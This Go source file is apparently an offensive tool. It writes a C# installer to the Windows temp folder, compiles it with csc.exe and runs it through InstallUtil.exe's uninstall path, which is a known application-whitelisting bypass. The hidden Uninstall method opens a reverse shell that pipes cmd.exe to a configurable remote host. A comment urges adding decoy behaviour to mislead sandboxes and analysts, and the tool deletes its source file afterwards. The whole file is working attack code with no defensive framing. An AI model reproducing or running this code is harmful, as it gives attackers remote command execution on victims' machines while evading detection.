package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

var instutil, cscpath, instutilpath string

//MANAGERIP connection string to the manager
const MANAGERIP = "RHOST"

//REMOTEPORT to connect to the manager
const REMOTEPORT = "RPORT"

func init() {
	instutil = `using System;
	using System.Collections;
	using System.Collections.Generic;
	using System.ComponentModel;
	using System.Configuration.Install;
	using System.Diagnostics;
	using System.IO;
	using System.Net.Sockets;
	using System.Text;
	
	
	namespace WindowsService1
	{
		public class Program
		{
	
			public static void Main()
			{
				Console.WriteLine("Hello From Main...I Don't Do Anything");
				//Add any behaviour here to throw off sandbox execution/analysts :)
	
			}
		}
	
		[System.ComponentModel.RunInstaller(true)]
		public partial class ProjectInstaller : System.Configuration.Install.Installer
		{
			StreamWriter streamWriter;
	
			public override void Uninstall(System.Collections.IDictionary savedState)
			{
				Console.WriteLine("Hello From Uninstall...I carry out the real work...");
				revconnect();
			}
	
			private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
			{
				StringBuilder strOutput = new StringBuilder();
	
				if (!String.IsNullOrEmpty(outLine.Data))
				{
					try
					{
						strOutput.Append(outLine.Data);
						streamWriter.WriteLine(strOutput);
						streamWriter.Flush();
					}
					catch (Exception) { }
				}
			}
			public void revconnect()
			{
				try
				{
					using (TcpClient client = new TcpClient("IPHERE", PORTHERE))
					{
						using (Stream stream = client.GetStream())
						{
							using (StreamReader rdr = new StreamReader(stream))
							{
								streamWriter = new StreamWriter(stream);
	
								StringBuilder strInput = new StringBuilder();
	
								Process p = new Process();
								p.StartInfo.FileName = "cmd.exe";
								p.StartInfo.CreateNoWindow = true;
								p.StartInfo.UseShellExecute = false;
								p.StartInfo.RedirectStandardOutput = true;
								p.StartInfo.RedirectStandardInput = true;
								p.StartInfo.RedirectStandardError = true;
								p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
								p.Start();
								p.BeginOutputReadLine();
	
								while (true)
								{
									strInput.Append(rdr.ReadLine());
									p.StandardInput.WriteLine(strInput);
									strInput.Remove(0, strInput.Length);
								}
							}
						}
					}
				}
				catch (Exception)
				{
	
	
				}
			}
		}
	}
	`
	cscpath = `C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe`
	instutilpath = `C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe`
}

func checkerr(err error) {
	if err != nil {

		fmt.Println(err)
	}
}

func main() {
	createinstlutiltemplate(MANAGERIP, REMOTEPORT)
	instexe := exec.Command(cscpath, `/out:C:\Windows\temp\goinstut.exe`, `C:\Windows\temp\insutil.cs`)
	err := instexe.Start()
	checkerr(err)
	executeshell := exec.Command(instutilpath, `/logfile=`, `/LogToConsole=false`, `/U`, `C:\Windows\temp\goinstut.exe`)
	err = executeshell.Start()
	checkerr(err)
	os.Remove(`C:\Windows\temp\insutil.cs`)
}

func createinstlutiltemplate(ip, port string) {
	ipreplaced := strings.Replace(instutil, "IPHERE", ip, 1)
	portreplaced := strings.Replace(ipreplaced, "PORTHERE", port, 1)
	foinstlutil, err := os.Create(`C:\Windows\temp\insutil.cs`)

	checkerr(err)
	defer foinstlutil.Close()
	foinstlutil.WriteString(portreplaced)
}
